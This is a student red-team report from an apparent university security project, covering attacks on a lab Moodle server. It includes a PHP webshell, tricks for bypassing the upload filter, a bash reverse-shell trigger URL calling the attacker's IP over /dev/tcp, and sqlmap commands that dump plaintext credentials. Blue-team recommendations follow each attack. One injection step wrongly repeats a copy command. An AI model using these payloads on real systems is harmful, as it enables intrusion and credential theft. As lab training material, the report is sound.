# 🛡️ SSI Project – Red Team Exploitation Report

This report presents the various exploitation attempts made as part of the Information Systems Security (ISS) project, from a Kali Linux machine aimed at compromising the Moodle web server hosted on Ubuntu.
The aim was to obtain a reverse shell using an upload vulnerability.

## First attack

---

## 🔍 Objective

The aim of the attack was to :

- Bypass the **upload file filtering** system
- Upload a **file containing malicious PHP code**.
- Execute this code remotely via the browser
- Establish a **reverse shell connection** to the Kali machine (attacker)

---

## 🔓 Technical context

- Target machine (victim)** : Ubuntu 22.04, Moodle server with an upload form
- Attacking machine** : Kali Linux on the same local network (192.168.56.X)
- PHP-side back-end filtering** prevents the upload of suspicious files via a blacklist of strings such as :

php
eval(, system(, exec(, shell_exec(, base64_decode(,
passthru(, pcntl_exec(, posix_getuid(, <script>, etc.

---

🧨Attack I – Reverse Shell Attempts

### Step 1: Create a PHP reverse shell

On Kali, I created a basic shell:
    
```bash
<?php system($_GET['cmd']); ?>
```

### Step 2: Attempt to bypass with double extensions

- First attempt: rename file to shell.php.png
- Then: shell.png.php
    
![image](https://github.com/user-attachments/assets/00e97c40-51be-48d6-8671-289b41d04f29)
         
I then tried uploading the malicious file:   
         ![image](https://github.com/user-attachments/assets/699bb173-b445-476f-9f4a-ee2bbad396f5)
         

We obtained :

![image](https://github.com/user-attachments/assets/26c0b211-1f3f-4d17-b24f-16c3fb27d836)

🔴 Failed: The backend detected the malicious content, despite the file appearing as an image.


Error message:


❌ File failed security scan


---
    
    
Filtering Bypass Attempts

Attempt: Appending PHP payload directly to an image

```bash
echo "<?php system(\$_GET['cmd']); ?>" >> shell.png
mv shell.png shell.php.png
```
 
     
Working Solution: Metadata Injection + Obfuscation 

   1. Use a clean, existing image
          
        ```bash
        cp /usr/share/icons/gnome/256x256/devices/computer.png shell.png
        ```
                          
        ![image](https://github.com/user-attachments/assets/d6660168-cb58-419d-b93f-e2ee53d6af1f)

    
   2. Inject an obfuscated PHP payload into the image’s metadata
      ```bash
        cp /usr/share/icons/gnome/256x256/devices/computer.png shell.png
        ```
    
   This avoids all blacklisted keywords (system, eval, etc.)        
    
   3. Renommer l’image avec une double extension
      ```bash
        mv shell.png shell.php.png
        ```

   4. Upload successful  

   ![image](https://github.com/user-attachments/assets/24ff24d8-0afd-49c9-a9ed-a2ddf21052de)
    

The file passed the scan because :

- The visible image content was clean

- The malicious payload was hidden in metadata

- No blacklisted strings were detected


---
   
Final Goal: Trigger Remote Code Execution

1. Start a Netcat listener on Kali:

   ```bash
   nc -lvnp 4444
   ```

   ![image](https://github.com/user-attachments/assets/f4e72480-6804-4099-8820-356d4f934546)
    
 2. Trigger the payload through the browser
    ```bash
    http://192.168.56.101:5173/upload/shell.php.png?a=system&b=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.56.102/4444+0>%261'
    ```   

Conclusion :

Although the full reverse shell wasn’t successfully established (due to server-side execution restrictions or PHP config), the following was achieved:

✅ Successfully bypassed file upload filtering
✅ Uploaded a disguised PHP webshell
✅ Injected a stealthy payload using image metadata
✅ Identified and documented backend protections

This demonstrates that poorly configured file upload systems remain vulnerable, especially when tools like exiftool can inject code into alternate vectors like metadata.




Blue Team Recommendations :

To improve the defense against such attacks:

✅ Implement deep filtering of metadata (Title, Description, EXIF Comment)

✅ Disable PHP execution in upload directories

✅ Rename and hash uploaded files server-side

✅ Add server-side antivirus scanning (e.g., ClamAV) and sandbox execution for analysis

---

## Second attack

---

## 🔍 Objective
The goal of this attack was to:
* Detect SQL injection vulnerabilities in the login process
* Exploit the injection to extract data from the database
* Demonstrate the risk of improperly handled SQL inputs
* Retrieve sensitive information from the ssi_project database

---
  
## 🔓 Technical Context
* Target (Victim): Ubuntu 22.04 running Apache2, MySQL 8.0, Moodle web service
* Attacker (Red Team): Kali Linux, connected via internal network (192.168.56.X)
* Login page vulnerable to SQL injection via POST parameter username
* No input sanitization or prepared statements in the PHP back-end

--- 
## 💥 Attack I – SQL Injection on Login Form

### Step 1: Reconnaissance and Injection Point
The login form sends POST data to login.php:
```bash
curl -X POST -d "username=test&password=test" http://192.168.56.100:8082/login.php
```
Observed response:
```bash
{"status": "error"}
```
![image](https://github.com/user-attachments/assets/60e6235f-f04b-4ba6-8fc6-c954126cd1c9)

Testing with crafted payload:
```bash
curl -X POST -d "username=' OR 1=1 -- -&password=x" http://192.168.56.100:8082/login.php
Still returns:
```
{"status": "error"}

![image](https://github.com/user-attachments/assets/64f92c05-19b1-4545-822c-e85994fd79b5)

### Step 2: Use sqlmap to Confirm Injection
Using sqlmap:
```bash
sqlmap -u "http://192.168.56.100:8082/login.php" --data="username=test&password=test" --batch --level=5 --risk=3
```

Result:
* SQLi confirmed on username via error-based, boolean-based, time-based, and UNION injection
* Extracted tables: users, events


### Step 3: Dumping Database Contents
#### 1: Detecting SQL Injection
```bash
sqlmap -u "http://192.168.56.100:8082/login.php" \
       --method=POST \
       --data="username=test&password=test" \
       --batch --level=2 --risk=1
```
Result: SQLMap identified that the username parameter is injectable via:

Boolean-based blind

Error-based

Time-based blind

UNION-based injection

DBMS: MySQL >= 5.6

#### 2: Database Enumeration

 List all databases
```bash
sqlmap -u "http://192.168.56.100:8082/login.php" \
       --method=POST \
       --data="username=test&password=test" \
       -b --dbs
```
✅ Found database: ssi_project

 List tables from ssi_project
```bash
sqlmap -u "http://192.168.56.100:8082/login.php" \
       --method=POST \
       --data="username=test&password=test" \
       -D ssi_project --tables
```

![image](https://github.com/user-attachments/assets/0882f0ff-8d11-40aa-bd27-e272df636eb9)

![image](https://github.com/user-attachments/assets/694a4ce4-672c-49df-b5e5-57c5e434a13a)

✅ Found tables: users, events

#### 3: Dumping User Credentials
```bash
sqlmap -u "http://192.168.56.100:8082/login.php" \
       --method=POST \
       --data="username=test&password=test" \
       -D ssi_project -T users --dump
```
![image](https://github.com/user-attachments/assets/d22ef777-7b28-4937-813a-2716f1a7460e)

Extracted records:
```bash
Database: ssi_project
Table: users
+----+----------------------+---------+----------+----------+
| id | email                | role    | password | username |
+----+----------------------+---------+----------+----------+
| 1  | vince@bare.com       | student | bare     | vincent  |
| 2  | jules@fedit.com      | teacher | fedit    | jules    |
| 4  | gauthier@mallard.com | student | mallard  | gauthier |
+----+----------------------+---------+----------+----------+

```
⚡ These passwords appear to be stored in plaintext, which is a major security vulnerability.

And then with events table : 
```bash
Database: ssi_project                                                                                                                                                   
Table: events
[3 entries]
+----+---------+-----------------------------------------+------------+---------------------------------------+
| id | user_id | title                                   | event_date | description                           |
+----+---------+-----------------------------------------+------------+---------------------------------------+
| 1  | 2       | Cours de PHP                            | 2025-04-02 | Introduction au langage PHP           |
| 2  | 1       | R\\u00e9vision s\\u00e9curit\\u00e9 web | 2025-04-05 | <script>alert(\\"XSS!\\");<\\/script> |
| 3  | 1       | Examen final                            | 2025-04-10 | Salle 203 - 14h                       |
+----+---------+-----------------------------------------+------------+---------------------------------------+

```
![image](https://github.com/user-attachments/assets/9dc84bb9-a2b9-4104-949c-b87e0f961d48)


## ✅ Achievements
* Detected and exploited a critical SQL injection vulnerability
* Fully extracted user credentials and event data
* Demonstrated the lack of prepared statements and input validation

## 🛡️ Blue Team Recommendations
1. Use prepared statements with parameter binding
2. Hash passwords using password_hash() instead of storing them in plaintext
3. Implement WAF (Web Application Firewall) to block SQLi attempts
4. Limit SQL error output in production to avoid exposing database structure
5. Log and monitor login attempts to detect anomalies
6. Use LIMIT 1 and safe user query patterns
This report validates the critical impact of SQL injection and demonstrates the ease of database compromise in the absence of secure coding practices.

